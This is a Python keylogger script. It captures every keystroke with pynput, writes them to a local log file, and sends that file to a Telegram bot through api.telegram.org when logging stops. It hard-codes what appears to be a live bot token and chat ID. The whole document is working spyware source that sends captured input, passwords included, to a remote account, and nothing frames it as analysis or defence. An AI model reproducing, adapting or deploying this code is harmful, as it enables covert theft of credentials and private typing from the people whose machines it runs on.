from pynput.keyboard import Key, Listener
import os
import requests
import time

# Telegram Bot details
bot_token = "6816068092:AAGmXmmoGFpbH2QklJyCv5d8Xwg1yduX9QQ"  # Replace with your bot token
chat_id = "609356128"      # Replace with your chat ID

# File to store the keystrokes
log_file = "key_log.txt"

# Function to write keystrokes to the file
def write_to_file(key):
    with open(log_file, "a") as f:
        k = str(key).replace("'", "")
        if k.find("space") > 0:
            f.write("\n")
        elif k.find("Key") == -1:
            f.write(k)

# Function called when a key is pressed
def on_press(key):
    write_to_file(key)

# Function called when a key is released
def on_release(key):
    # Stops the listener when escape key is pressed
    if key == Key.esc:
        return False

# Function to send the log file via Telegram
def send_telegram_message(chat_id, text):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {"chat_id": chat_id, "text": text}
    retries = 5
    for _ in range(retries):
        try:
            response = requests.post(url, data=payload)
            response.raise_for_status()  # Raise an HTTPError for bad responses
            print(f"Message sent: {text}")
            return
        except requests.exceptions.RequestException as e:
            print(f"Failed to send message: {e}")
            time.sleep(5)  # Wait before retrying
    print("Max retries exceeded for send_telegram_message")

def send_telegram_file(chat_id, file_path):
    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
    with open(file_path, "rb") as f:
        files = {"document": f}
        data = {"chat_id": chat_id}
        retries = 5
        for _ in range(retries):
            try:
                response = requests.post(url, data=data, files=files)
                response.raise_for_status()  # Raise an HTTPError for bad responses
                print(f"File sent: {file_path}")
                return
            except requests.exceptions.RequestException as e:
                print(f"Failed to send file: {e}")
                time.sleep(5)  # Wait before retrying
    print("Max retries exceeded for send_telegram_file")

# Set up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# Send the log file via Telegram once the keylogger stops
if os.path.exists(log_file):
    send_telegram_message(chat_id, "Key log file is ready. Sending the file...")
    send_telegram_file(chat_id, log_file)
